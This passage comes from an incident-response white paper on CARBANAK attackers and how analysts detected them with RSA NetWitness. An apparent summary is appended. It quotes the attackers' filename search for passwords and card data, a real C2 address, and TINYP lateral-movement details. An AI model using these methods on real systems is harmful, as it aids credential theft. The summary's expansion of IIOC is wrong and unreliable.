+port 443. The following subset of the query associated with Figure 33 can be
+used to find this traffic.
+direction = outbound && service = 80 && tcp.dstport = 443 &&
+session.analysis = ‘direct to ip http request’
+This query returns the results shown in Figure 39.
+Figure 39: Identification of GOTROJ HTTP #wget User-Agent
+42
+WHITE PAPER
+In Figure 39, an additional HTTP User-Agent is observed: ‘go-http-client/1.1.’
+The sessions associated with this User-Agent are the sessions in which files
+were downloaded via the GOTROJ Trojan. Adding this information to the
+query associated with Figure 33 returns the following:
+direction = outbound && service = 80 && tcp.dstport = 443 && session.analysis =
+‘direct to ip http request’ && client begins ‘wget’,’go-’
+With these queries built around behavioral attacker TTPs, as observed during
+the time of engagement, any reliance on traditional atomic indicators is
+removed from the investigation. Instead, the actions required of the attackers
+(such as operating system command execution and interaction, file download,
+etc.) are focused upon, as well as the way that their TTP and toolsets perform
+these actions. Thus any changes in C2, filenames, hashes, user-agents, etc., can
+be quickly identified and included in the continuing investigation.
+4.6.2 Host Visibility and Indicators
+This section discusses the methodology and RSA NetWitness Endpoint
+Instant IOCs (IIOCs) and content used by RSA IR during this investigation.
+The methodology used in this section is described in detail in the RSA
+NetWitness Endpoint User Guide found here. [18]
+The CARBANAK actors involved during this engagement were particularly
+careful to leave as little file, log or execution traces as possible. This included,
+but was not limited to, ad hoc download of tools as needed, preference for
+lateral tool movement, log deletion automatically built into tools, immediate
+deletion of tools and logs upon logout of systems, and removal of entries from
+centralized log repositories.
+During this engagement, the RSA NetWitness Endpoint agent was deployed
+to all Red Hat Enterprise Linux (RHEL) and CentOS 6 and 7 systems, as they
+could support it. The detection of attacker activity on these systems within
+RSA NetWitness Endpoint utilized aspects of the attacker actions and toolset
+utilizations that deviated from legitimate installed binary usage. An example
+of this is the usage of the AUDITUNNEL and the SSHDOOR client and server
+binaries. Originally, the attackers placed the SSHDOOR binaries in /usr/bin
+and /usr/sbin as a replacement for the system OpenSSH client and server
+binaries. However, upon the remediation of system ALPHA, the attackers
+utilized the SSHDOOR binaries in the non-standard location of /usr/share/
+man/mann . The initial placement of SSHDOOR was observed by reviewing
+any binaries automatically started as part of systemd or init.d, and had a hash
+value that didn’t match the one in the RPM package list. These attributes
+are recorded in the IIOCs of RSA NetWitness Endpoint and are shown in the
+SSHDOOR detection in Figure 40.
+18 “RSA NetWitness Endpoint User Guide”; https://community.rsa.com/docs/DOC-72935
+WHITE PAPER
+Figure 40: File Hash Mismatch and system/init.d Autostart in SSHDOOR Detection
+Once the attackers moved to a non-standard location, this was easily
+identified, as they were the only common system service binaries not running
+in either /sbin or /usr/sbin . The aspects of both instances of SSHDOOR use are
+illustrated in Figure 41.
+Figure 41: Malicious Binary Usage in Non-Standard Locations and Without
+Associated Packages
+In Figure 41, we observe two separate sshd binaries running on the system.
+As SSH only requires one instance of its service binary running at a time,
+this is an anomaly. Add to this the non-standard location of /usr/share/man/
+mann in which the second sshd is executing, and the fact that this binary
+cannot be associated with a legitimately installed RPM package, this activity
+immediately becomes suspect and warrants investigation. The legitimate sshd
+service binary process is also highlighted as running from /usr/sbin .
+Another method of identifying the attacker activity during this engagement
+involved the command line arguments used by the attackers. Essentially,
+while the attackers could change directory locations, filenames and even
+hashes, the base functionality of the tools themselves could not readily
+or easily be changed. Given that the command line arguments of the tool
+indicated the functionality being utilized, RSA IR analysts zeroed in on the
+unique command line arguments of the tools being use by the attackers. As
+an example, the usage of any web address or IP address in the command line
+arguments became immediately suspect and reviewed, as shown in Figure 42.
+43
+WHITE PAPER
+Figure 42: IP Address, Port Switch, and Port Number in Program Arguments
+As a follow-up to these findings, RSA IR analysts utilized some of the base
+functions of the RSA NetWitness Endpoint agent in order to gain additional
+artifacts and information associated with known indicators. During this
+engagement, the directory /usr/share/man/mann was the primary working
+directory for system BRAVO . In using this indicator during scoping
+investigations, the file contents for /usr/share/man/mann were requested
+from every Linux server in the environment. The purpose of this was to
+determine if this directory was being maliciously used on any systems within
+the environment and to gain additional evidence that may not have executed
+during the agent’s tenure on the system.
+Figure 43: RSA NetWitness Endpoint Request for All Files in Directory /usr/share/
+man/mann
+In requesting files for this directory across all systems, analysts are able
+to determine if there are additional tools or malware artifacts used by
+the attackers within the same directory. Additionally, this action can also
+determine if the binaries observed executing from this directory exist on any
+other systems. Both cases are shown in the results of this action from the
+Global Downloads section shown in Figure 44.
+44
+WHITE PAPER
+Figure 44: Additional Findings via Mass File Download Request for Directory /usr/
+share/man/mann
+The functionality is also useful in acquiring key host artifacts, such as
+configuration files and host logs, across all systems within the environment
+and then processing and reviewing them in aggregate in order to gain more
+contextual information and situational awareness.
+While contextual forensic data within host artifacts could identify some
+attacker activity, much of the most commonly utilized host forensic data
+either was not useful or was not available on the hosts affected during this
+engagement. While aggregate analysis of artifacts, such as NTFS Master File
+Tables, AmCache, SYSTEM and SOFTWARE Registry Hives, and Windows
+Event Logs, could identify certain aspects of the attackers’ actions, they were
+consistently ineffective at providing the necessary level of granularity to track
+the attackers’ actions appropriately. However, using the RSA NetWitness
+Endpoint agent already present on the hosts to provide this critical host data,
+the aforementioned artifacts became force multipliers by providing additional
+context to the actions observed in RSA NetWitness Suite.
+The attackers utilized a specific staging directory on each host in which they
+took any significant action. In order to appear more legitimate to security
+analysts and tools, they utilized the legitimate Microsoft Windows directory
+for 32-bit applications utilizing the Taiwan Chinese language pack on 64-bit
+versions of Windows, C:\Windows\SysWoW64\zh-TW . While this directory
+is a legitimate Windows system directory, no server systems within this
+environment were legitimately utilizing the Taiwan Chinese language directory.
+As such, this became a useful and actionable IOC for scoping and tracking
+any systems with substantial actor activity. An example of attacker use of this
+directory, as observed in RSA NetWitness Endpoint, is shown in Figure 45.
+45
+46
+WHITE PAPER
+Figure 45: C:\Windows\SysWOW64\zh-TW Working Directory, UIAutomationCore
+WGET Usage, and TINYP Download and Renaming
+In Figure 45 above, the usage of the UIAutomationCore.dll.bin WGET binary
+to download attacker tools and the immediate renaming of those tools are
+shown. This, again, became an excellent actionable IOC to track adversary
+activity. The same contextual aspects that were utilized in the network IOC
+for WGET usage in Figure 33 are also used here. By identifying any command
+executions that utilize a command line argument of ‘ http:// ’ followed by
+an IP address, RSA IR was able to identify any and all instances in which
+the attackers downloaded tools. In hunting for this activity, we use the
+same methodology used in Section 3.3.1, identifying aspects of the activity
+associated with IIOCs and reviewing those IIOCs for activity. In this case,
+the UIAutomationCore.dll.bin WGET binary download is an unsigned module,
+located within a legitimate Windows directory, communicates to an external
+source directly to IP address and writes an executable to disk. The IIOCs
+shown in Figure 46 reflect this activity.
+Figure 46: Instant IOCs Representing UIAutomationCore.dll.bin
+WGET Binary Activity
+As stated in the section associated with Table 15, the TINYP binary is a
+modification of the SysInternals PSEXEC remote access utility. Just like
+PSEXEC, the TINYP binary sends a service binary to the ADMIN$ share (C:\
+Windows) of the target host. The target host executes this service binary, and
+the TINYP tool connects to that service binary. When identifying attacker
+lateral movement from the perspective of the target system, the PSEXESVC.
+exe TINYP service binary executes the remote command requested by the
+attacker system. The view of this activity in RSA NetWitness Endpoint is
+illustrated in Figure 47.
+47
+WHITE PAPER
+Figure 47: TINYP Execution from Source (Red) and Target (Blue) Perspective
+Figure 47 illustrates the most common use case for the TINYP binary
+observed: lateral movement via remote command shell execution. In the
+figure above, the source host perspective of TINYP execution is shown in the
+red boxes, while the target host perspective of TINYP execution is shown in
+the blue boxes. In the box labeled “1,” we see file PSEXESVC.exe service binary
+being written to the C:\Windows directory, which represents the ADMIN$
+SMB/CIFS network share. Once the service binary is placed in the ADMIN$
+share, a Windows Registry entry is created in the SYSTEM Registry Hive under
+the path HKLM\SYSTEM\ControlSet001\services\PSEXESVC . Once the service
+binary is placed on the system, a Windows Service is created to execute the
+service binary. This is observed in the last item in box “1,” as the Windows
+Services Control Manager services.exe executes the PSEXESVC.exe process.
+Upon the second execution of the TINYP binary, the Windows SYSTEM
+Registry Key is not created, as it already exists on the system, and it is
+important to note that the Registry entry is only created on the first
+execution. This information can be used to determine the first host access
+by this method. On the second execution, represented by the box labeled
+“2,” we see the Windows Local Security Authentication Server binary lsass.
+exe opening the PSEXESVC.exe service process. This is the actor attempting
+to authenticate to the remote system under whatever credentials they have
+acquired. Once authenticated, the process goes into the box labeled “3,”
+where the PSEXESVC.exe service binary executes the Windows Command
+Processor cmd.exe remotely on behalf of the attacker. It is important to note
+that while the calling parent binary on the target system is the TINYP binary
+ps.exe, all actions executed by TINYP will be carried out by the PSEXESVC.
+exe service binary on the target system. Given this, we can identify remote
+command shell execution via PSEXEC for any instance in which PSEXESVC.exe
+Creates Process cmd.exe, which we established was the primary use case for
+this tool in this engagement.
+Knowing this, and knowing that the legitimate PSEXEC utility is often widely
+used by system administrators, the difference in the legitimate PSEXEC and
+the TINYP binaries or their service binaries is particularly useful to incident
+responders. In reviewing the service binaries of both tools in RSA NetWitness
+Endpoint, we identify differences we can use to distinguish between legitimate
+and malicious activity. A view of one difference is shown in Figure 48.
+48
+WHITE PAPER
+Figure 48: TINYP vs PSEXEC Service Binaries
+In Figure 48, we see that the PSEXESVC.exe service binary used by TINYP has
+a valid Microsoft signature, though it is about 40KB smaller than the legitimate
+PSEXEC service binary. While the signature for this binary is valid, even valid
+information can become an actionable IOC. In this particular engagement, the
+version of PSEXEC that was legitimately being used by system administrators
+was signed by SysInternals, much like the figure above. With this being the
+case, any PSEXESVC service binaries that were Microsoft signed became
+immediately suspect during this investigation. Additionally, the TINYP binary
+itself was unsigned, standing in stark difference from its legitimate PSEXEC
+counterpart. The differences in these binaries are shown in Figure 49.
+Figure 49: TINYP vs. PSEXEC—Module Differences
+In Figure 49, we observe the following differences in the TINYP binary and
+legitimate PSEXEC:
+
+The TINYP binary resides within a consistent directory of _C:\Windows_
+
+SysWOW64\zh-TW .
+
+The TINYP binary has a very recent compile time from the time of initial
+
+entry into the environment.
+
+
+The TINYP binary has no value in the Description section of its header.
+
+
+The TINYP binary is not signed.
+
+
+Given this, should the attackers change filename or location, this can be
+hunted for by viewing only unsigned binaries with no Description values and
+sorted by compile time to identify binaries compiled within close proximity to
+the compile time of this binary.
+In order to reduce time to detection of this activity, IIOC content for RSA
+NetWitness Endpoint has been created and included in the Digital Appendix
+associated with this document.
+The majority of the attackers’ actions-on-objective were conducted using
+commands residing within, and are functions of, the Windows Command
+Processor cmd.exe . While there are a variety of commands available to users
+at the Windows Command Prompt, a specific subset of these commands are
+internal to the cmd.exe binary and therefore will not cause additional process
+creation. These commands are listed in Table 25.
+|Internal Windows Command Processor Commands|Col2|
+|---|---|
+|ASSOC|MKLINK (vista and above)|
+|BREAK|MOVE|
+|CALL|PATH|
+|CD/CHDIR|PAUSE|
+|CLS|POPD|
+|COLOR|PROMPT|
+|COPY|PUSHD|
+|DATE|REM|
+|DEL|REN/RENAME|
+|DIR|RD/RMDIR|
+|DPATH|SET|
+|ECHO|SETLOCAL|
+|ENDLOCAL|SHIFT|
+|ERASE|START|
+|EXIT|TIME|
+|FOR|TITLE|
+|FTYPE|TYPE|
+|GOTO|VER|
+|IF|VERIFY|
+|KEYS|VOL|
+|MD/MKDIR||
+49
+WHITE PAPER
+Table 25: List of Commands Internal to the Windows Command Processor
+Throughout this engagement, the primary attacker actions consisted of
+traversing directories and outputting files, looking for files that may contain
+additional credentials, database information, internal infrastructure
+documentation, and financial data such as PCI data. The majority of the
+commands utilized consisted of the CD, TYPE, ECHO, DATE and DIR . As none
+of these commands call additional binaries, the attackers would reside almost
+completely within the cmd.exe process for the majority of their host actions.
+Four distinct external commands were utilized by the attackers in traversing
+the host filesystems as part of their internal reconnaissance activities: net.exe,
+ipconfig.exe, find.exe and qwinsta.exe . Knowing this, any time cmd.exe called any
+of these binaries, it was considered suspect activity. However, two of these
+commands were specific to the actor activity and were thereby utilized as a
+high-fidelity indication of attacker activity. The find.exe command searches
+a specified file or piped input for a defined string given in the command
+arguments, much like the grep binary does on Linux and UNIX hosts. The
+attackers would use this binary in the following command string
+dir /b /s 2>nul | find /I “phrase”
+WHITE PAPER
+where the “phrase” would be a string of interest to the attackers, such as
+“PCI,” “Passwords” and “Credit Card.” This command would list the filenames
+of all files in all subdirectories under the present working directory, and then
+only display the ones with the required string in the filename. Since the DIR
+command is part of the Windows Command Processor, but the FIND command
+is a separate binary, we observe this activity in RSA NetWitness Endpoint via
+the cmd.exe process calling find.exe with arguments, as illustrated in Figure 50.
+Figure 50: cmd.exe Calling find.exe as a Piped Directory Listing Search
+The qwinsta.exe binary identifies all currently logged-in users via command
+line session, console session or RDP session, and displays the user logged
+in and the type of session they are associated with. The attackers would
+use this for two primary functions on the majority of hosts they interacted
+with. The first would be to check other users logged in to the system as a
+monitor to determine if their activity was being detected, and also to identify
+administrative users logged in whose credentials they could harvest from
+memory. The second was to identify what systems users were engaging
+the system with, and what method of access they were using. This gave the
+attackers additional information with which to map the internal systems
+and networks. Additionally, the attackers were the only users executing this
+command anywhere within the environment, as the system administrators
+did not use this command in any of their administrative functions. This
+contextual information allowed RSA IR to utilize these IOCs with significant
+effectiveness during the course of the engagement. An example of this
+activity is shown in Figure 51.
+Figure 51: qwinsta.exe Being Called by cmd.exe
+The GOTROJ RAT used by the attackers in this engagement was primarily
+utilized by installing it as a Windows Service, starting the service and then
+deleting the service once the Trojan was executing successfully in memory.
+Evidence of this activity, as observed in Application Tracking within RSA
+NetWitness Endpoint, is shown in Figure 52 and Figure 53.
+50
+51
+WHITE PAPER
+Figure 52: Installation of GOTROJ RAT Via Windows Service
+Figure 53: Deletion of GOTROJ Windows Service After Execution
+Once successfully executed, GOTROJ communicates with 107.181.246.146
+over TCP port 443. When reviewing the host screen’s Scan Data tab, under
+the Processes section, we see where the network connection is correlated
+with the running ctlmon.exe process by clicking on it, as shown in Figure 54.
+Figure 54: GOTROJ Process Executing and Network Connection Information
+Additionally, the GOTROJ ctlmon.exe binary itself can be triaged via
+the RSA NetWitness Endpoint module analyzer in order to identify the
+imported function and DLL information, entropy, PE header information and
+searchable static strings analysis. One common initial triage search pattern
+for identifying possible C2 strings is common web port value strings, such as
+“:443.” The use of this search string to triage the GOTROJ Trojan identifies
+the C2 IP address and port value in a clear text string at offset 0x3049304, as
+evidenced in Figure 55.
+Figure 55: C2 IP and Port Identification in Cursory Analysis via RSA NetWitness
+Endpoint Module Analyzer
+WHITE PAPER
+Output : 
+### Summary of Key Points from the Incident Response Report
+
+#### Overview:
+This document details the findings and methodologies used during an incident response engagement to detect and analyze attacker activities within a Windows environment. The attackers utilized various techniques, including custom tools, internal commands, and RATs (Remote Access Trojans) to achieve their objectives.
+
+### Key Tools and Techniques:
+
+1. **TINYP vs. PSEXEC:**
+   - **TINYP**:
+     - Resides in the directory `C:\Windows\SysWOW64\zh-TW`.
+     - Has a very recent compile time.
+     - No value in the Description section of its header.
+     - Not signed.
+   - **PSEXEC**:
+     - Legitimate version is signed by SysInternals.
+     - Service binary has a valid Microsoft signature but is smaller than the legitimate PSEXEC service binary.
+   - **Detection:**
+     - Unsigned binaries with no Description values and recent compile times can be hunted for.
+     - High-fidelity IOC (Indicator of Compromise) based on these differences.
+
+2. **GOTROJ RAT:**
+   - Installed as a Windows Service, started, and then deleted once executed in memory.
+   - Communicates with the C2 server at `107.181.246.146` over TCP port 443.
+   - Detected via RSA NetWitness Endpoint by analyzing network connections and process executions.
+
+### Command Usage:
+- **Internal Windows Commands:**
+  - Primarily used for directory traversal, file listing, and basic operations (e.g., `CD`, `TYPE`, `ECHO`, `DATE`, `DIR`).
+  - These commands do not create additional processes, allowing attackers to remain within the `cmd.exe` process.
+
+- **External Commands:**
+  - **`find.exe`:**
+    - Used to search for specific strings in filenames (e.g., "PCI", "Passwords", "Credit Card").
+    - Command format: `dir /b /s 2>nul | find /I “phrase”`.
+  - **`qwinsta.exe`:**
+    - Identifies logged-in users and session types.
+    - Used to monitor user activity and identify administrative users for credential harvesting.
+
+### Detection and Analysis:
+- **RSA NetWitness Endpoint:**
+  - **Application Tracking:**
+    - Monitors the installation, execution, and deletion of services (e.g., GOTROJ RAT).
+  - **Module Analyzer:**
+    - Analyzes binaries to identify imported functions, DLLs, entropy, and static strings.
+    - Common search patterns include web port value strings (e.g., ":443") to identify C2 IP addresses.
+
+### IIOC Content:
+- **IIOC (Incident Objectives and Intelligence Criteria) content** has been created and included in the Digital Appendix of this document to reduce time to detection for similar activities.
+
+### Conclusion:
+This report provides a comprehensive overview of the attacker's techniques, tools, and command usage. It also outlines the methods used to detect and analyze these activities using RSA NetWitness Endpoint. The provided IIOC content can help in quickly identifying and responding to similar incidents in the future.
